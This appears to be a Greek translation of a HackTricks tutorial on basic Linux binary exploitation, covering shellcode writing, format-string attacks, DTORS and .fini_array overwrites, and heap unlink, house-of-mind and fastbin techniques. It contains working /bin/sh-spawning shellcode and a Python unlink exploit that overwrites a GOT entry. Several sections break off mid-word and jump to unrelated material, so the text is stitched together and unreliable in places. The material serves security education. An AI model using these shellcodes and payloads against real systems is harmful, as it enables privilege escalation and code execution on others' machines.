# Linux Exploiting (Βασικό) (SPA)

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Red Team του HackTricks AWS)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του GitHub.

</details>

## **2.SHELLCODE**

Δείτε τις διακοπές πυρήνα: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep “\_\_NR\_”

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(“/bin/sh”, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; καθαρίζουμε τον eax\
xor ebx, ebx ; ebx = 0 γιατί δεν υπάρχει παράμετρος που να περνάμε\
mov al, 0x01 ; eax = 1 —> \_\_NR\_exit 1\
int 0x80 ; Εκτέλεση syscall

**nasm -f elf assembly.asm** —> Επιστρέφει ένα .o\
**ld assembly.o -o shellcodeout** —> Δίνει ένα εκτελέσιμο που αποτελείται από τον συναρμολογημένο κώδικα και μπορούμε να εξάγουμε τα opcodes με το **objdump**\
**objdump -d -Mintel ./shellcodeout** —> Για να δούμε ότι πράγματι είναι ο κώδικας μας και να εξάγουμε τα OpCodes

**Ελέγξτε ότι ο κώδικας shell λειτουργεί**
```
char shellcode[] = “\x31\xc0\x31\xdb\xb0\x01\xcd\x80”

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
Για να ελέγξετε αν οι κλήσεις συστήματος γίνονται σωστά, πρέπει να μεταγλωττίσετε το πρόγραμμα παραπάνω και οι κλήσεις συστήματος πρέπει να εμφανιστούν στο **strace ./PROGRAMA\_COMPILADO**

Κατά τη δημιουργία shellcodes μπορείτε να χρησιμοποιήσετε ένα κόλπο. Η πρώτη εντολή είναι ένα jump σε ένα call. Το call καλεί τον αρχικό κώδικα και επιπλέον τοποθετεί το EIP στο stack. Μετά την εντολή call έχουμε τοποθετήσει το string που χρειαζόμαστε, έτσι με αυτό το EIP μπορούμε να δείξουμε στο string και να συνεχίσουμε την εκτέλεση του κώδικα.

Π.χ. **ΚΟΛΠΟΣ (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al último call
popl                %esi                                       ; Guardamos en ese la dirección al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=“/bin/sh”
leal                 0x8(%esi), %ecx      ; arg[2] = {“/bin/sh”, “0”}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(“/bin/sh”, [“/bin/sh”, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instrución
.string             \”/bin/sh\”                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
**Χρήση του Stack(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; “\0”
push               dword 0x68732f2f ; “//sh”
push               dword 0x6e69622f; “/bin”
mov                ebx, esp                     ; arg1 = “/bin//sh\0”
push               eax                             ; Null -> args[1]
push               ebx                             ; “/bin/sh\0” -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(“/bin/sh”, args[“/bin/sh”, “NULL”], NULL)
```
**ΕΚΤΕΛΕΣΗ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutó fabs
…
```
**Κυνηγός Αυγών:**

Αυτό είναι ένα μικρό κομμάτι κώδικα που διατρέχει τις σελίδες μνήμης που σχετίζονται με ένα διεργασία σε αναζήτηση του shellcode που είναι αποθηκευμένο εκεί (ψάχνει για κάποια υπογραφή που έχει το shellcode). Χρήσιμο σε περιπτώσεις όπου υπάρχει μικρός χώρος για να ενθάρρυνει κώδικα.

**Πολυμορφικά Shellcodes**

Αυτά είναι κρυπτογραφημένα shellcodes που περιέχουν ένα μικρό κομμάτι κώδικα που τα αποκρυπτογραφεί και αλλάζει σε αυτό, χρησιμοποιώντας το κόλπο του Call-Pop, αυτό θα ήταν ένα **παράδειγμα κρυπτογράφησης Caesar**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerá)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aquí va el shellcode
```
## **5. Συμπληρωματικές μεθόδοι**

**Ret2Ret**

Χρήσιμο όταν δεν είναι δυνατή η εισαγωγή μιας διεύθυνσης στο stack στο EIP (ελέγχεται ότι το EIP δεν περιέχει 0xbf) ή όταν δεν είναι δυνατός ο υπολογισμός της τοποθεσίας του shellcode. Ωστόσο, η ευάλωτη συνάρτηση δέχεται ένα παράμετρο (εκεί θα μπει το shellcode).

Έτσι, αλλάζοντας το EIP με μια διεύθυνση ενός **ret**, θα φορτωθεί η επόμενη διεύθυνση (που είναι η διεύθυνση του πρώτου ορίσματος της συνάρτησης). Αυτό σημαίνει ότι θα φορτωθεί το shellcode.

Το exploit θα είναι: SHELLCODE + Γέμισμα (μέχρι το EIP) + **\&ret** (τα επόμενα bytes της στοίβας δείχνουν στην αρχή του shellcode καθώς εισάγεται στη στοίβα η διεύθυνση της παραμετροποιημένης παράμετρου)

Φαίνεται ότι συναρτήσεις όπως **strncpy** μετά την ολοκλήρωσή τους αφαιρούν από τη στοίβα τη διεύθυνση όπου ήταν αποθηκευμένο το shellcode, αδυνατώντας αυτή την τεχνική. Αυτό σημαίνει ότι η διεύθυνση που περνάνε στη συνάρτηση ως όρισμα (αυτή που αποθηκεύει το shellcode) τροποποιείται από ένα 0x00, οπότε κατά τη δεύτερη κλήση **ret** βρίσκεται με ένα 0x00 και το πρόγραμμα καταρρέει.

**Τεχνική του Murat**

Στο linux όλα τα προγράμματα χαρτογραφούνται ξεκινώντας από το 0xbfffffff

Διαπιστώνοντας πώς δημιουργείται η στοίβα ενός νέου διεργασίας στο linux, μπορεί να αναπτυχθεί ένα exploit έτσι ώστε το πρόγραμμα να εκκινείται σε ένα περιβάλλον όπου η μοναδική μεταβλητή είναι το shellcode. Η διεύθυνση αυτής μπορεί να υπολογιστεί ως: addr = 0xbfffffff - 4 - strlen(NOMBRE\_ejecutable\_completo) - strlen(shellcode)

Με αυτόν τον τρόπο θα μπορούσε εύκολα να πάρει τη διεύθυνση όπου βρίσκεται η μεταβλητή περιβάλλοντος με το shellcode.

Αυτό μπορεί να γίνει χάρη στο γεγονός ότι η συνάρτηση execle επιτρέπει τη δημιουργία ενός περιβάλλοντος που να έχει μόνο τις μεταβλητές περιβάλλοντος που επιθυμούνται

**Υπερχείλιση ακεραίων**

Αυτού του είδους οι υπερχειλίσεις συμβαίνουν όταν μια μεταβλητή δεν είναι προετοιμασμένη να υποστηρίξει έναν τόσο μεγάλο αριθμό όσο αυτός που δίνεται, πιθανώς λόγω σύγχυσης μεταξύ μεταβλητών με και χωρίς πρόσημο, για παράδειγμα:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
Στο παραπάνω παράδειγμα βλέπουμε ότι το πρόγραμμα αναμένει 2 παραμέτρους. Το πρώτο είναι το μήκος της επόμενης αλυσίδας και το δεύτερο η αλυσίδα.

Εάν δώσουμε έναν αρνητικό αριθμό ως πρώτη παράμετρο, θα εμφανιστεί ότι len < 256 και θα περάσουμε αυτό το φίλτρο, επιπλέον το strlen(buffer) θα είναι μικρότερο από το l, καθώς το l είναι unsigned int και θα είναι πολύ μεγάλο.

Αυτού του είδους τα overflows δεν αποσκοπούν στο να γράψουν κάτι στη διαδικασία του προγράμματος, αλλά να υπερβούν κακώς σχεδιασμένα φίλτρα για να εκμεταλλευτούν άλλες ευπαθείς σημεία.

**Μη αρχικοποιημένες μεταβλητές**

Δεν γνωρίζουμε την τιμή που μπορεί να πάρει μια μη αρχικοποιημένη μεταβλητή και μπορεί να είναι ενδιαφέρον να την παρακολουθήσουμε. Μπορεί να πάρει την τιμή που είχε μια μεταβλητή από την προηγούμενη συνάρτηση και αυτή να ελέγχεται από τον εισβολέα.

##

###

###

###

### **.fini\_array**

Ουσιαστικά αυτό είναι ένας πίνακας με **συναρτήσεις που θα κληθούν** πριν το πρόγραμμα τελειώσει. Αυτό είναι ενδιαφέρον εάν μπορείτε να καλέσετε το **shellcode σας απλά αποπηδώντας σε μια διεύθυνση**, ή σε περιπτώσεις όπου χρειάζεται να επιστρέψετε πάλι στο main για να **εκμεταλλευτείτε τη μορφή της συμβολοσειράς μια δεύτερη φορά**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Σημείωσε ότι αυτό **δεν** θα **δημιουργήσει** έναν **αιώνιο βρόγχο** επειδή όταν επιστρέψεις στο κύριο πρόγραμμα, το canary θα το παρατηρήσει, το τέλος της στοίβας μπορεί να έχει καταστραφεί και η συνάρτηση δεν θα κληθεί ξανά. Έτσι, με αυτό θα μπορείς να **έχεις 1 ακόμη εκτέλεση** του ευπαθούς.

### **Μορφοποίηση Συμβολοσειράς για Απορρόφηση Περιεχομένου**

Μια συμβολοσειρά μορφοποίησης μπορεί επίσης να καταχραστεί για να **απορροφήσει περιεχόμενο** από τη μνήμη του προγράμματος.\
Για παράδειγμα, στην ακόλουθη κατάσταση υπάρχει μια **τοπική μεταβλητή στη στοίβα που δείχνει σε ένα σημαία.** Αν **βρεις** πού στη **μνήμη** είναι το **δείκτης** προς τη **σημαία**, μπορείς να κάνεις το **printf να έχει πρόσβαση** σε αυτήν τη **διεύθυνση** και να **εκτυπώσει** τη **σημαία**:

Έτσι, η σημαία είναι στο **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

Και από τη διαρροή μπορείς να δεις ότι ο **δείκτης προς τη σημαία** είναι στην **8η** παράμετρο:

![](<../../.gitbook/assets/image (623).png>)

Έτσι, **προσπελαύνοντας** την **8η παράμετρο** μπορείς να πάρεις τη σημαία:

![](<../../.gitbook/assets/image (624).png>)

Σημείωσε ότι ακολουθώντας τη **προηγούμενη εκμετάλλευση** και αντιλαμβανόμενος ότι μπορείς να **διαρρεύσεις περιεχόμενο** μπορείς να **ορίσεις δείκτες** στο **`printf`** στην ενότητα όπου το **εκτελέσιμο** φορτώνεται και να το **απορροφήσεις** **ολοκληρωτικά**!

### **DTOR**

{% hint style="danger" %}
Σήμερα είναι πολύ **παράξενο να βρεις ένα δυαδικό με μια ενότητα dtor**.
{% endhint %}

Οι καταστροφείς είναι συναρτήσεις που **εκτελούνται πριν το πρόγραμμα τελειώσει**.\
Αν καταφέρεις να **γράψεις** μια **διεύθυνση** σε ένα **shellcode** στο **`__DTOR_END__`**, αυτό θα **εκτελεστεί** πριν το πρόγραμμα τελειώσει.\
Πάρε τη διεύθυνση αυτής της ενότητας με:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep “__DTOR”
```
Συνήθως θα βρείτε την ενότητα **DTOR** **μεταξύ** των τιμών `ffffffff` και `00000000`. Έτσι, αν βλέπετε μόνο αυτές τις τιμές, σημαίνει ότι **δεν υπάρχει καμία συνάρτηση που έχει καταχωρηθεί**. Έτσι, **αντικαταστήστε** το **`00000000`** με τη **διεύθυνση** του **shellcode** για να το εκτελέσετε.

### **Μορφοποίηση Συμβολοσειρών για Υπερχείλιση Προσωρινής Μνήμης**

Η **sprintf** μεταφέρει μια μορφοποιημένη συμβολοσειρά **σε** μια **μεταβλητή**. Έτσι, μπορείτε να καταχραστείτε τη **μορφοποίηση** μιας συμβολοσειράς για να προκαλέσετε μια **υπερχείλιση προσωρινής μνήμης στη μεταβλητή** όπου αντιγράφεται το περιεχόμενο.\
Για παράδειγμα, το φορτίο `%.44xAAAA` θα **εγγράψει 44B+"AAAA" στη μεταβλητή**, το οποίο μπορεί να προκαλέσει υπερχείλιση προσωρινής μνήμης.

### **Δομές \_\_atexit**

{% hint style="danger" %}
Σήμερα είναι πολύ **παράξενο να εκμεταλλευτείτε αυτό**.
{% endhint %}

Η **`atexit()`** είναι μια συνάρτηση στην οποία **περνιούνται ως παράμετροι άλλες συναρτήσεις.** Αυτές οι **συναρτήσεις** θα **εκτελεστούν** κατά την εκτέλεση ενός **`exit()`** ή την **επιστροφή** από τη **main**.\
Αν μπορείτε να **τροποποιήσετε** τη **διεύθυνση** οποιασδήποτε από αυτές τις **συναρτήσεις** ώστε να δείχνει σε ένα shellcode για παράδειγμα, τότε θα **κερδίσετε έλεγχο** της **διαδικασίας**, αλλά αυτό είναι προς το παρόν πιο περίπλοκο.\
Προς το παρόν οι **διευθύνσεις των συναρτήσεων** που θα εκτελεστούν είναι **κρυμμένες** πίσω από αρκετές δομές και τελικά η διεύθυνση στην οποία δείχνουν δεν είναι οι διευθύνσεις των συναρτήσεων, αλλά είναι **κρυπτογραφημένες με XOR** και μετατοπίσεις με ένα **τυχαίο κλειδί**. Έτσι αυτός ο διανυσματικός επιθετικός δεν είναι πολύ χρήσιμος τουλάχιστον σε x86 και x64\_86.\
Η **συνάρτηση κρυπτογράφησης** είναι **`PTR_MANGLE`**. **Άλλες αρχιτεκτονικές** όπως m68k, mips32, mips64, aarch64, arm, hppa... **δεν υλοποιούν τη συνάρτηση κρυπτογράφησης** επειδή **επιστρέφουν το ίδιο** με αυτό που λαμβάνουν ως είσοδο. Έτσι αυτές οι αρχιτεκτονικές θα μπορούσαν να είναι επιθετικές από αυτό το διάνυσμα.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Σήμερα είναι πολύ **παράξενο να εκμεταλλευτείτε αυτό**.
{% endhint %}

Η **`Setjmp()`** επιτρέπει να **αποθηκεύσετε** το **πλαίσιο** (τα καταχωρητές)\
Η **`longjmp()`** επιτρέπει να **επαναφέρετε** το **πλαίσιο**.\
Οι **αποθηκευμένοι καταχωρητές** είναι: `EBX, ESI, EDI, ESP, EIP, EBP`\
Αυτό που συμβαίνει είναι ότι τα EIP και ESP περνιούνται από τη **συνάρτηση PTR_MANGLE**, οπότε οι **αρχιτεκτονικές ευάλωτες σε αυτήν την επίθεση είναι οι ίδιες με παραπάνω**.\
Είναι χρήσιμα για ανάκτηση σφαλμάτων ή διακοπές.\
Ωστόσο, από ό,τι έχω διαβάσει, οι άλλοι καταχωρητές δεν προστατεύονται, **έτσι αν υπάρχει ένα `call ebx`, `call esi` ή `call edi`** μέσα στη συνάρτηση που καλείται, μπορεί να πάρει τον έλεγχο. Ή μπορείτε επίσης να τροποποιήσετε τον EBP για να τροποποιήσετε το ESP.

**VTable και VPTR στη C++**

Κάθε κλάση έχει μια **Vtable** που είναι ένας πίνακας με **δείκτες προς μεθόδους**.

Κάθε αντικείμενο μιας **κλάσης** έχει ένα **VPtr** που είναι ένας **δείκτης** προς τον πίνακα της κλάσης του. Το VPtr είναι μέρος της κεφαλίδας κάθε αντικειμένου, οπότε αν μια **αντικατάσταση** του **VPtr** επιτευχθεί, μπορεί να **τροποποιηθεί** ώστε να δείχνει σε μια ψεύτικη μέθοδο, έτσι ώστε η εκτέλεση μιας συνάρτησης να πάει στο shellcode.

## **Προληπτικά μέτρα και αποφυγές**

###

**Αντικατάσταση του Libsafe**

Ενεργοποιείται με: LD\_PRELOAD=/lib/libsafe.so.2\
ή\
“/lib/libsave.so.2” > /etc/ld.so.preload

Ορισμένες επικίνδυνες κλήσεις συναρτήσεων αντικαθίστανται με ασφαλείς. Δεν είναι τυποποιημένο. (μόνο για x86, όχι για συλλογές με -fomit-frame-pointer, όχι στατικές συλλογές, όχι όλες οι ευάλωτες συναρτήσεις γίνονται ασφαλείς και το LD\_PRELOAD δεν λειτουργεί σε δυαδικά με suid).

**ASCII Armored Address Space**

Αφορά τη φόρτωση κοινόχρηστων βιβλιοθηκών από 0x00000000 έως 0x00ffffff ώστε να υπάρχει πάντα ένα byte 0x00. Ωστόσο, αυτό πραγματικά δεν σταματά σχεδόν καμία επίθεση, και λιγότερο σε little endian.

**ret2plt**

Αφορά την εκτέλεση ενός ROP έτσι ώστε να καλείται η συνάρτηση strcpy@plt (από την plt) και να δείχνει στην είσοδο της GOT και να αντιγράφει τον πρώτο byte της συνάρτησης που θέλετε να καλέσετε (system()). Στη συνέχεια γίνεται το ίδιο δείχνοντας στην GOT+1 και αντιγράφοντας το 2ο byte του system()... Τελικά καλείται η διεύθυνση που αποθηκεύεται στην GOT που θα είναι system()

**Κλουβιά με chroot()**

debootstrap -arch=i386 hardy /home/user —> Εγκαθιστά ένα βασικό σύστημα σε ένα συγκεκριμένο υποκατάλογο

Ένας διαχειριστής μπορεί να βγει από αυτά τα κλουβιά κάνοντας: mkdir foo; chroot foo; cd ..

**Εργαλεία κώδικα**

Valgrind —> Ανιχνεύει σφάλματα\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Υπερχειλίσεις Στοίβας: Βασικά Εκμεταλλεύματα**

**Κομμάτι που έχει εκχωρηθεί**

prev\_size |\
size | —Κεφαλίδα\
\*mem | Δεδομένα

**Ελεύθερο κομμάτι**

prev\_size |\
size |\
\*fd | Δείκτης προς το επόμενο κομμάτι\
\*bk | Δείκτης προς το προηγούμενο κομμάτι —Κεφαλίδα\
\*mem | Δεδομένα

Τα ελεύθερα κομμάτια βρίσκονται σε μια λίστα διπλά συνδεδεμένη (bin) και δεν μπορούν να υπάρχουν δύο ελεύθερα κομμάτια μαζί (συγχωνεύονται)

Στο "size" υπάρχουν bits για να υποδεικνύουν: Αν το προηγούμενο κομμάτι είναι σε χρήση, αν το κομμάτι έχει εκχωρηθεί μέσω του mmap() και αν το κομμάτι ανήκει στον κύριο χώρο μνήμης.

Όταν απελευθερώνετε ένα κομμάτι, αν κάποιο από τα γειτονικά είναι ελε
**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes filler**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I”, 0xfffffff0) #Ενδιαφέρει το bit που υποδεικνύει ότι το προηγούμενο κομμάτι είναι ελεύθερο να είναι 1**

**fake\_size = pack("\<I”, 0xfffffffc) #-4, ώστε να νομίζει ότι το "size" του 3ου κομματιού είναι 4bytes πίσω (δείχνει στο prev\_size) όπου ελέγχει αν το 2ο κομμάτι είναι ελεύθερο**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #Στο payload στην αρχή θα βάλουμε 8bytes filler**

**got\_free = pack("\<I", 0x08048300 - 12) #Διεύθυνση της free() στο plt-12 (θα είναι η διεύθυνση που θα αντικατασταθεί για να εκτελεστεί το shellcode τη 2η φορά που καλείται η free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #Όπως αναφέρθηκε, το payload ξεκινά με 8 bytes filler γιατί ναι**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Τροποποιείται το 2ο κομμάτι, το got\_free δείχνει όπου θα αποθηκευτεί η διεύθυνση addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() απελευθερώνοντας με αντίστροφη σειρά (wargame)**

Έχουμε έλεγχο σε 3 συνεχόμενα chunks και απελευθερώνονται με αντίστροφη σειρά από την κράτηση.

Σε αυτήν την περίπτωση:

Στο κομμάτι c τοποθετείται το shellcode

Το κομμάτι a χρησιμοποιείται για να αντικαταστήσει το b έτσι ώστε το μέγεθος να έχει απενεργοποιημένο το bit PREV\_INUSE ώστε να νομίζει ότι το κομμάτι a είναι ελεύθερο.

Επιπλέον, αντικαθιστάται στην κεφαλή του b το μέγεθος ώστε να είναι -4.

Έτσι, το πρόγραμμα θα νομίζει ότι το "a" είναι ελεύθερο και σε ένα bin, οπότε θα καλέσει το unlink() για να το αποσυνδέσει. Ωστόσο, καθώς το προηγούμενο μέγεθος του κομματιού "a" είναι -4, θα νομίζει ότι το κομμάτι "a" πραγματικά ξεκινάει από το b+4. Δηλαδή, θα κάνει unlink() σε ένα κομμάτι που ξεκινάει από το b+4, οπότε στο b+12 θα είναι το δείκτης "fd" και στο b+16 θα είναι ο δείκτης "bk".

Με αυτόν τον τρόπο, αν βάλουμε τη διεύθυνση του shellcode στο bk και τη διεύθυνση της συνάρτησης "puts()" -12 στο fd έχουμε το payload μας.

**Τεχνική Frontlink**

Το frontlink καλείται όταν κάτι απελευθερώνεται και κανένα από τα διπλανά του κομμάτια δεν είναι ελεύθερα, δεν καλείται το unlink() αλλά καλείται απευθείας το frontlink().

Χρήσιμη ευπάθεια όταν το malloc που επιτίθεται δεν απελευθερώνεται ποτέ (free()).

Χρειάζεται:

Ένα buffer που μπορεί να υπερχειλιστεί με τη συνάρτηση εισόδου δεδομένων

Ένα buffer δίπλα σε αυτό που πρέπει να απελευθερωθεί και στο οποίο θα τροποποιηθεί το πεδίο fd της κεφαλής του χάρη στην υπερχείλιση του προηγούμενου buffer

Ένα buffer προς απελευθέρωση με μέγεθος μεγαλύτερο από 512 αλλά μικρότερο από τον προηγούμενο buffer

Ένα buffer που δηλώνεται πριν το βήμα 3 που επιτρέπει την υπερεγγραφή του prev\_size αυτού

Με αυτόν τον τρόπο επιτυγχάνοντας την υπερεγγραφή σε δύο mallocs με ανεξέλεγκτο τρόπο και σε έναν ελεγχόμενο τρόπο αλλά που απελευθερώνεται μόνο αυτός, μπορούμε να κάνουμε ένα exploit.

**Ευπάθεια double free()**

Αν κληθεί δύο φορές η free() με την ίδια δείκτη, υπάρχουν δύο bins που δείχνουν στην ίδια διεύθυνση.

Σε περίπτωση που θέλουμε να χρησιμοποιήσουμε έναν θα του ανατεθεί χωρίς προβλήματα. Σε περίπτωση που θέλουμε να χρησιμοποιήσουμε έναν άλλο, θα του ανατεθεί το ίδιο χώρο, έτσι τα δείκτες "fd" και "bk" θα παραπλανηθούν με τα δεδομένα που θα γράψει η προηγούμενη κράτηση.

**Μετά την free()**

Ένας προηγουμένως απελευθερωμένος δείκτης χρησιμοποιείται ξανά χωρίς έλεγχο.

## **8 Υπερχειλίσεις στην Heap: Προηγμένα Exploits**

Οι τεχνικές Unlink() και FrontLink() αφαιρέθηκαν καθώς τροποποιήθηκε η συνάρτηση unlink().

**The house of mind**

Απαιτείται μόνο μια κλήση στη free() για να προκαλέσει την εκτέλεση κώδικα αυθαίρετα. Ενδιαφέρον είναι να βρεθεί ένα δεύτερο κομμάτι που μπορεί να υπερχειλιστεί από ένα προηγούμενο και να απελευθερωθεί.

Μια κλήση στη free() προκαλεί την κλήση της public\_fREe(mem), αυτή κάνει:

mstate ar\_ptr;

mchunkptr p;

…

p = mem2chunk(mes); —> Επιστρέφει ένα δείκτη στη διεύθυνση όπου ξεκινά το κομμάτι (mem-8)

…

ar\_ptr = arena\_for\_chunk(p); —> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

…

\_int\_free(ar\_ptr, mem);

}

Στο \[1] ελέγχει το πεδίο size το bit NON\_MAIN\_ARENA, το οποίο μπορεί να τροποποιηθεί ώστε ο έλεγχος να επιστρέψει true και να εκτελέσει το heap\_for\_ptr() που κάνει ένα and στο "mem" αφήνοντας τα 2,5 λιγότερο σημαντικά bytes (στην περίπτωσή μας από το 0x0804a000 αφήνει το 0x08000000) και προσπελαύνει το 0x08000000->ar\_ptr (σαν ένα struct heap\_info)

Με αυτόν τον τρόπο, αν μπορούμε να ελέγξουμε ένα κομμάτι για παράδειγμα στο 0x0804a000 και θα απελευθερωθεί ένα κομμάτι στο **0x081002a0** μπορούμε να φτάσουμε στη διεύθυνση 0x08100000 και να γράψουμε ό,τι θέλουμε, για παράδειγμα **0x0804a000**. Όταν αυτό το δεύτερο κομμάτι απελευθερωθεί, θα βρει ότι το heap\_for\_ptr(ptr)->ar\_ptr επιστρέφει αυτό που έχουμε γράψει στο 0x08100000 (καθώς εφαρμόζεται το and στο 0x081002a0 που είδαμε πριν και από εκεί παίρνει την τιμή των πρώτων 4 bytes, το ar\_ptr)

Με αυτόν τον τρόπο καλείται το \_int\_free(ar\_ptr, mem), δηλαδή, **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
…\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Όπως είδαμε πριν μπορούμε να ελέγξουμε την τιμή του av, καθώς είναι αυτό που γράψαμε στο κομμάτι που θα απελευθερωθεί.

Όπως ορίζεται η unsorted\_chunks, ξέρουμε ότι:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Επομένως, αν στο av->bins\[2] γράψουμε την τιμή του \_\_DTOR\_END\_\_-12, στην τελευταία εντολή θα γραφτεί στο \_\_DTOR\_END\_\_ η διεύθυνση του δείκτη προηγούμενου μεγέθ
Για να εφαρμοστεί αυτή η τεχνική, απαιτούνται ορισμένες προϋποθέσεις που δυσκολεύουν λίγο περισσότερο το payload.

Αυτή η τεχνική δεν είναι πλέον εφαρμόσιμη επειδή εφαρμόστηκε σχεδόν το ίδιο patch με αυτό του unlink. Συγκρίνονται εάν ο νέος τόπος προορισμού προσανατολίζεται και αυτός προς αυτόν.

**Fastbin**

Είναι μια παραλλαγή του The house of mind

Ενδιαφερόμαστε να εκτελέσουμε τον ακόλουθο κώδικα που εκτελείται μετά τον έλεγχο της συνάρτησης \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] —> Με fastbin\_index(sz) —> (sz >> 3) - 2

…

p->fd = \*fb

\*fb = p

Με αυτόν τον τρόπο, αν τοποθετηθεί στο "fb" δίνει τη διεύθυνση μιας συνάρτησης στην GOT, σε αυτή τη διεύθυνση θα τοποθετηθεί η διεύθυνση του κομματιού που έχει αντικατασταθεί. Για να γίνει αυτό, θα πρέπει η αρένα να βρίσκεται κοντά στις διευθύνσεις των dtors. Πιο συγκεκριμένα, το av->max\_fast πρέπει να βρίσκεται στη διεύθυνση που θα αντικατασταθεί.

Δεδομένου ότι με το The House of Mind είδαμε ότι εμείς ελέγχαμε τη θέση του av.

Έτσι, αν στο πεδίο size βάλουμε ένα μέγεθος 8 + NON\_MAIN\_ARENA + PREV\_INUSE —> fastbin\_index() θα μας επιστρέψει fastbins\[-1], που θα δείχνει στο av->max\_fast

Σε αυτήν την περίπτωση, το av->max\_fast θα είναι η διεύθυνση που θα αντικατασταθεί (όχι στην οποία δείχνει, αλλά αυτή η θέση θα αντικατασταθεί).

Επιπλέον, πρέπει να ισχύει ότι το κομμάτι που είναι δίπλα στο απελευθερωμένο πρέπει να είναι μεγαλύτερο από 8 -> Δεδομένου ότι είπαμε ότι το μέγεθος του απελευθερωμένου κομματιού είναι 8, σε αυτό το ψεύτικο κομμάτι απλά πρέπει να βάλουμε ένα μέγεθος μεγαλύτερο από 8 (καθώς επίσης το shellcode θα βρίσκεται στο απελευθερωμένο κομμάτι, θα πρέπει να βάλουμε ένα jmp που θα πέσει σε nops).

Επιπλέον, αυτό το ίδιο ψεύτικο κομμάτι πρέπει να είναι μικρότερο από το av->system\_mem. Το av->system\_mem βρίσκεται 1848 bytes πιο πέρα.

